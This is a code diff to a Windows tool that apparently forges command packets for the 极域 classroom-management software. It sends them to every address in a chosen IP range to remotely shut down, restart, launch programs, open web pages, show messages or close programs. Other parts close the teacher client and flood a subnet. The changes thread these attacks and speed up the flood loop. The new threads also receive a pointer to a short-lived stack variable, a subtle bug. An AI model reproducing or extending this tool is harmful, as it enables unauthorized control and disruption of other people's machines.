@@ -159,7 +159,12 @@ struct IPandi
 };
 bool IPsearched[30][256];//判断ip是否被寻找过 0->未寻找 1->只寻找过ip 2->完全寻找
 int SearchThreadCount;//当前存在的线程数
-
+struct CaseandVer
+{
+	int Case;
+	BOOL ver2021;
+	wchar_t* text;
+};
 //杂项全局变量
 Mypair DragState;
 POINT DragDefPoint;//记录拖动窗口控件时的鼠标坐标
@@ -2910,8 +2915,12 @@ void shutdown2010(char* addr, int Case)
 	if (Case == 3) { cc[19] = (char)GetTickCount(); cc[20] = (char)(GetTickCount() * 2); TDRsend(addr, 4605, cc, 582); }
 	return;
 }
-void act2016(int Case, BOOL ver2021)//将关机or重启命令依次执行(2015~2021版)
+
+DWORD WINAPI Act2016Thread(LPVOID pM)//将关机or重启命令依次执行(2015~2021版)
 {
+	CaseandVer *cv= (CaseandVer*)pM;
+	int Case = cv->Case; BOOL ver2021 = cv->ver2021;
+
 	int a = min(mywtoi(TDR.Edit[7].str), mywtoi(TDR.Edit[8].str)), b = max(mywtoi(TDR.Edit[7].str), mywtoi(TDR.Edit[8].str));
 	if (a < 0)a = 0;
 	if (b > 255)b = 255;
@@ -2932,9 +2941,11 @@ void act2016(int Case, BOOL ver2021)//将关机or重启命令依次执行(2015~2
 		shutdown2016(tmp2, Case, ver2021);
 	}
 	SetTextBar(TDR.GetStr(L"cmdok"), TRUE);
+	return 0;
 }
-void act2010(int Case)//将关机or重启命令依次执行(2007 2010版)
+DWORD  WINAPI Act2010Thread(LPVOID pM)//将关机or重启命令依次执行(2012 2010版)
 {
+	int Case = *((int*)pM);
 	int a = min(mywtoi(TDR.Edit[7].str), mywtoi(TDR.Edit[8].str)), b = max(mywtoi(TDR.Edit[7].str), mywtoi(TDR.Edit[8].str));
 	for (int i = a; i <= b; ++i)
 	{
@@ -2954,7 +2965,9 @@ void act2010(int Case)//将关机or重启命令依次执行(2007 2010版)
 		shutdown2010(tmp2, Case);
 	}
 	SetTextBar(TDR.GetStr(L"cmdok"), TRUE);
+	return 0;
 }
+
 void text2016(const char* addr, int Case, char text[], int len, BOOL ver2021)
 {//负责新版字符串命令执行的函数
 	char aa[910], bb[960], cc[960];
@@ -2982,11 +2995,14 @@ void text2016(const char* addr, int Case, char text[], int len, BOOL ver2021)
 		for (int j = 55; j < 56 + len * 2; ++j, bb[j] = text[j - 56]);
 		if (ver2021)TDRsend(addr, 4988, bb, 954); else TDRsend(addr, 4705, bb, 955);
 	}
-	return;
+	return ;
 }
 
-void act2016text(int Case, wchar_t* text, BOOL ver2021)//将带有文字的命令依次执行
+DWORD  WINAPI  Act2016textThread(LPVOID pM)
 {
+	CaseandVer* cv = (CaseandVer*)pM;
+	int Case = cv->Case; BOOL ver2021 = cv->ver2021; wchar_t* text = cv->text;
+
 	int a = min(mywtoi(TDR.Edit[7].str), mywtoi(TDR.Edit[8].str)), b = max(mywtoi(TDR.Edit[7].str), mywtoi(TDR.Edit[8].str));
 	wchar_t txt[1001];
 	myZeroMemory(txt, sizeof(txt));
@@ -3067,17 +3083,17 @@ DWORD WINAPI net4372(LPVOID pM)
 	mystrcpy(ip123, tmp2->ip);
 	*(mystrrchr(ip123, '.') + 1) = 0;
 
-	translateTDRstr(neta, aa, sizeof(neta) / sizeof(int), 43);
-	translateTDRstr(netb, bb, sizeof(netb) / sizeof(int), 72);
+	translateTDRstr(neta, aa, sizeof(neta) / sizeof(int), sizeof(aa));
+	translateTDRstr(netb, bb, sizeof(netb) / sizeof(int), sizeof(bb));
 	while (1)
 	{
+		//s();
 		for (int i = 0; i < 255; ++i)
 		{
-			if (30 > i && 200 < i)++i;
 			mystrcpy(addr, ip123);
 			myitoa(i, tmp, 10);
 			mystrcat(addr, tmp);
-			Sleep(60);
+			Sleep(10);
 			TDRsend(addr, 4809, aa, 43);
 			TDRsend(addr, 5512, bb, 72);
 			if (!Main.Check[CHK_OFFLINE].Value)return 0;
@@ -3261,6 +3277,7 @@ void InitTDR()//初始化TDR
 	TDR.CreateCheck(330, 200, 0, 140, L" 2020版 & 2021版");
 	TDR.CreateCheck(330, 225, 0, 140, L" 2015版 ~ 2017版");
 	TDR.CreateCheck(330, 250, 0, 140, L" 2010版 & 2012版");
+	//TDR.CreateCheck(330, 250, 0, 140, L" 2010版 & 2012版");
 	TDR.Check[2].Value = true;
 
 	TDR.CreateText(308, 288, 0, L"t1", 0);
@@ -3389,50 +3406,37 @@ LRESULT CALLBACK TDRProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)/
 		switch (TDR.CoverButton)//按钮
 		{
 		case 1://远程关机
-		{
-			if (TDR.Check[1].Value)act2016(ACT_SHUTDOWN, TRUE);
-			if (TDR.Check[2].Value)act2016(ACT_SHUTDOWN, FALSE);
-			if (TDR.Check[3].Value)act2010(ACT_SHUTDOWN);
-			break;
-		}
 		case 2://远程重启
 		{
-			if (TDR.Check[1].Value)act2016(ACT_RESTART, TRUE);
-			if (TDR.Check[2].Value)act2016(ACT_RESTART, FALSE);
-			if (TDR.Check[3].Value)act2010(ACT_RESTART);
+			if (TDR.Check[1].Value) { CaseandVer a{ TDR.CoverButton/*Dangerous Action!*/, TRUE, 0}; CreateThread(0, 0, Act2016Thread, &a, 0, NULL); Sleep(2); }
+			if (TDR.Check[2].Value) { CaseandVer a{ TDR.CoverButton, FALSE, 0 }; CreateThread(0, 0, Act2016Thread, &a, 0, NULL); Sleep(2); }
+			if (TDR.Check[3].Value) { CaseandVer a{ TDR.CoverButton, 0, 0 }; CreateThread(0, 0, Act2010Thread, &a, 0, NULL); Sleep(2); }
 			break;
 		}
 		case 3://远程启动程序
-			if (TDR.Edit[1].str == 0)break;
-			if (*TDR.Edit[1].str == 0)break;
-			if (TDR.Check[1].Value)act2016text(ACTEXT_EXE, TDR.Edit[1].str, TRUE);
-			if (TDR.Check[2].Value)act2016text(ACTEXT_EXE, TDR.Edit[1].str, FALSE);
-			break;
 		case 4://远程网页
-			if (TDR.Edit[2].str == 0)break;
-			if (*TDR.Edit[2].str == 0)break;
-			if (TDR.Check[1].Value)act2016text(ACTEXT_HTTP, TDR.Edit[2].str, TRUE);
-			if (TDR.Check[2].Value)act2016text(ACTEXT_HTTP, TDR.Edit[2].str, FALSE);
-			break;
 		case 5://发消息
-			if (TDR.Edit[3].str == 0)break;
-			if (TDR.Check[1].Value)act2016text(ACTEXT_MESSAGE, TDR.Edit[3].str, TRUE);
-			if (TDR.Check[2].Value)act2016text(ACTEXT_MESSAGE, TDR.Edit[3].str, FALSE);
+		{
+			if (TDR.Edit[TDR.CoverButton-2].str == 0)break;
+			if (*TDR.Edit[TDR.CoverButton-2].str == 0&& TDR.CoverButton!=5)break;
+			if (TDR.Check[1].Value) { CaseandVer a{ TDR.CoverButton - 2, TRUE, TDR.Edit[TDR.CoverButton - 2].str }; CreateThread(0, 0, Act2016textThread, &a, 0, NULL); Sleep(2); }
+			if (TDR.Check[2].Value) { CaseandVer a{ TDR.CoverButton - 2, FALSE, TDR.Edit[TDR.CoverButton - 2].str }; CreateThread(0, 0, Act2016textThread, &a, 0, NULL); Sleep(2); }
 			break;
+		}
 		case 6://关闭教师端
 			filestart();
 			break;
 		case 7://远程极域窗口化
 		{
-			if (TDR.Check[1].Value)act2016(ACT_WINDOWFY, TRUE);
-			if (TDR.Check[2].Value)act2016(ACT_WINDOWFY, FALSE);
+			if (TDR.Check[1].Value) { CaseandVer a{ ACT_WINDOWFY, TRUE, 0 }; CreateThread(0, 0, Act2016Thread, &a, 0, NULL); Sleep(2); }
+			if (TDR.Check[2].Value) { CaseandVer a{ ACT_WINDOWFY, FALSE, 0 }; CreateThread(0, 0, Act2016Thread, &a, 0, NULL); Sleep(2); }
 			break;
 		}
 		case 8://远程关闭程序
 		{
-			if (TDR.Check[1].Value)act2016(ACT_CLOSE, TRUE);
-			if (TDR.Check[2].Value)act2016(ACT_CLOSE, FALSE);
-			if (TDR.Check[3].Value)act2010(ACT_CLOSE);
+			if (TDR.Check[1].Value) { CaseandVer a{ ACT_CLOSE, TRUE, 0 }; CreateThread(0, 0, Act2016Thread, &a, 0, NULL); Sleep(2); }
+			if (TDR.Check[2].Value) { CaseandVer a{ ACT_CLOSE, FALSE, 0 }; CreateThread(0, 0, Act2016Thread, &a, 0, NULL); Sleep(2); }
+			if (TDR.Check[3].Value) { CaseandVer a{ ACT_CLOSE, 0, 0 }; CreateThread(0, 0, Act2010Thread, &a, 0, NULL); Sleep(2); }
 			break;
 		}
 		case 9://切换网卡
@@ -3443,6 +3447,7 @@ LRESULT CALLBACK TDRProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)/
 			SendIP2Edit(tmp);
 			IPandi a{ Allips[curips] ,curips };
 			CreateThread(0, 0, SearchThreadStarter, &a, 0, NULL);
+			Sleep(2);
 			TDR.Redraw();
 			break;
 		}
